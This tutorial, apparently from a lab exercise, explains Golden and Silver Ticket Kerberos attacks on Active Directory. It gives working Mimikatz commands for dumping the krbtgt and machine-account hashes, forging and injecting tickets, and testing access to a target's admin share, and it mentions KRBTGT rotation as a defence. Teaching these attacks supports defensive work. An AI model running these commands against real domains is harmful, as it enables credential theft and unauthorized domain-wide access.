In the context of Windows Active Directory (AD) attacks, Golden Tickets and Silver Tickets are two powerful attack techniques that leverage Kerberos authentication to gain unauthorized access and maintain persistence in a domain.
Golden Tickets

> What is a Golden Ticket?

A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) that allows an attacker to impersonate any user, including domain administrators, in the AD environment. This ticket is generated using the Kerberos service account's password hash of **krbtgt** account.

> How it Works?

The krbtgt account is a special account in AD that is responsible for encrypting all TGTs. If an attacker compromises a domain controller or otherwise gains access to the krbtgt account hash, they can create a Golden Ticket. With this ticket, the attacker can **request access to any service within the domain**, essentially having unrestricted access.<br>
To perform this attack we need the following:

1- The krbtgt account hash.
```
lsadump::lsa /patch
```
2- The domain name.
```
Get-ADDomain
```
3- the domain SID.
```
(Get-ADDomain).DomainSID
```
Now that we have all the required information, we can relaunch Mimikatz:
```
mimikatz # kerberos::golden /admin:AnyName /domain:<DomainName> /id:500 /sid:<DomainSID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
```
> /admin - The username we want to impersonate. This does not have to be a valid user.<br>
> /domain - The FQDN of the domain we want to generate the ticket for.<br>
> /id -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.<br>
> /sid -The SID of the domain we want to generate the ticket for.<br>
> /krbtgt -The NTLM hash of the KRBTGT account.<br>
> /endin - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)<br>
> /renewmax -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)<br>
> /ptt - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.<br>

Even if the golden ticket has an incredibly long time, the blue team can still defend against this by simply rotating the KRBTGT password twice.<br>

**Silver Tickets**

> What is a Silver Ticket?

A Silver Ticket is a forged Kerberos Ticket Granting Service (TGS) ticket that allows an attacker to **access a specific service** or resource on a server without needing to interact with the domain controller.

> How it Works:

Silver Tickets are created using the password hash of a service account (such as HTTP, CIFS, etc.). The attacker forges a service ticket that grants them access to the specific service tied to that account. This ticket is then presented directly to the service, bypassing the need to go through the domain controller.

```
mimikatz # kerberos::golden /admin:AnyName /domain:<DomainName> /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
```
WE can get the server hostname and the NTML hash of the machine account of the target using **mimikatz**:
```
lsadump::lsa /patch
```
> The $ indicates that it is a machine account.

We can verify that the silver ticket is working by running the dir command against the target machine (ex: THMserver1):
```
dir \\THMserver1.<DomainName>\c$\
```


